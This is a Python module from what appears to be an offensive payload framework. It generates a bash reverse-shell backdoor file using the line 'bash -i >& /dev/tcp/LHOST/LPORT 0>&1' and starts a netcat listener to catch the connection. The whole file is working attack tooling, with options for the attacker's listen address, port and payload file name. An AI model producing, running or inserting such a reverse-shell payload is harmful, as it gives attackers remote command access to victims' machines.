import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_bash_reverse_tcp",
        "title"       : "Payload bash",
        "module"      : "payloads/nc/bash/reverse_tcp linux unix",
        "description" : "Payload creation and exploitation"
}


options ={
  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
  "LPORT" : [str(var.all_var['lport']),'The listen port'],
  "LNAME" : [str(var.all_var['lname']),'The name of payload [payload.sh]'],
  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.all_var['ltype'].lower() == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark = '/'
            f = open(var.all_var['lname'] , 'w')
            payload = '''
bash -i >& /dev/tcp/'''+var.all_var['lhost']+mark+var.all_var['lport']+''' 0>&1
'''
            f.write(payload)
            f.close()

        elif var.all_var['ltype'] == "listen" :
            os.system("nc -l -p "+str(var.all_var['lport'])+" -v")

        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
